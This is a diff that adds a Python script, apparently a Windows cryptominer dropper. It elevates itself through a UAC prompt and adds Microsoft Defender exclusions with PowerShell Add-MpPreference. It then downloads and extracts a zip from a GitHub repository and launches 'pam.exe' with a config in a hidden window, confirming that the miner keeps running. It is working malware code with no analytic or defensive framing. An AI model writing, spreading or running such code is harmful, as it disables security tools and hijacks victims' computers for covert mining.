@@ -1,0 +1,114 @@
+import sys, os, time, tempfile, zipfile, shutil, subprocess, ctypes, urllib.request
+
+# ------------------- Admin + UAC -------------------
+def is_admin():
+    try: return ctypes.windll.shell32.IsUserAnAdmin()
+    except: return False
+
+if not is_admin():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    sys.exit()
+
+# ------------------- Defender exclusion (run before anything) -------------------
+def add_exclusion(path):
+    print(f"[*] Adding Defender exclusion: {path}")
+    subprocess.run(
+        ['powershell', '-NoProfile', '-Command', f'Add-MpPreference -ExclusionPath "{path}" -Force'],
+        capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+    )
+    time.sleep(0.5)
+
+# ------------------- Main -------------------
+REPO_URL = "https://github.com/ivanban789/bom"
+TMP_DIR = os.path.join(tempfile.gettempdir(), "miner_launch")
+if os.path.exists(TMP_DIR):
+    shutil.rmtree(TMP_DIR)
+os.makedirs(TMP_DIR)
+
+# 1. Create extraction folder and add exclusion BEFORE downloading
+EXTRACT_DIR = os.path.join(TMP_DIR, "repo")
+os.makedirs(EXTRACT_DIR)
+add_exclusion(EXTRACT_DIR)
+
+# 2. Download
+print("[*] Downloading repo...")
+zip_path = os.path.join(TMP_DIR, "repo.zip")
+urllib.request.urlretrieve(REPO_URL, zip_path)
+
+# 3. Extract
+print("[*] Extracting...")
+with zipfile.ZipFile(zip_path, 'r') as zf:
+    zf.extractall(EXTRACT_DIR)
+
+# 4. Find packzz
+packzz = None
+for root, dirs, files in os.walk(EXTRACT_DIR):
+    if os.path.basename(root).lower() == 'packzz':
+        packzz = root
+        break
+if not packzz:
+    print("[-] packzz folder not found")
+    sys.exit(1)
+
+print(f"[+] packzz: {packzz}")
+add_exclusion(packzz)  # extra safety
+
+# 5. Extract any nested zips inside packzz
+for root, dirs, files in os.walk(packzz):
+    for f in files:
+        if f.endswith('.zip'):
+            nested = os.path.join(root, f)
+            with zipfile.ZipFile(nested, 'r') as zf:
+                zf.extractall(root)
+            os.remove(nested)
+            print(f"[*] Extracted nested: {f}")
+
+# 6. Find pam.exe and config
+pam_exe = None
+config = None
+for root, dirs, files in os.walk(packzz):
+    if 'pam.exe' in files:
+        pam_exe = os.path.join(root, 'pam.exe')
+    for f in files:
+        if f.startswith('config'):
+            config = os.path.join(root, f)
+
+if not pam_exe:
+    print("[-] pam.exe not found")
+    sys.exit(1)
+
+print(f"[+] pam.exe: {pam_exe}")
+if config:
+    print(f"[+] Config: {config}")
+else:
+    print("[!] No config found – miner will use default settings.")
+
+# 7. Launch
+workdir = os.path.dirname(pam_exe)
+cmd = [pam_exe]
+if config:
+    cmd.append(f'--config={config}')
+
+print("[*] Starting miner...")
+try:
+    proc = subprocess.Popen(cmd, cwd=workdir, creationflags=subprocess.CREATE_NO_WINDOW)
+    print(f"[+] Miner launched (PID {proc.pid})")
+    # Optional: check if it's alive after a few seconds
+    time.sleep(3)
+    # Quick check with psutil (if installed)
+    try:
+        import psutil
+        p = psutil.Process(proc.pid)
+        cpu = p.cpu_percent(interval=0.5)
+        if p.is_running():
+            print(f"[+] Miner is running (CPU ~{cpu}%)")
+        else:
+            print("[-] Miner stopped unexpectedly.")
+    except ImportError:
+        print("[*] Miner is running in the background.")
+except Exception as e:
+    print(f"[-] Failed to start miner: {e}")
+    sys.exit(1)
+
+print("[*] You can close this window. The miner will keep running.")
+input("Press Enter to exit...")
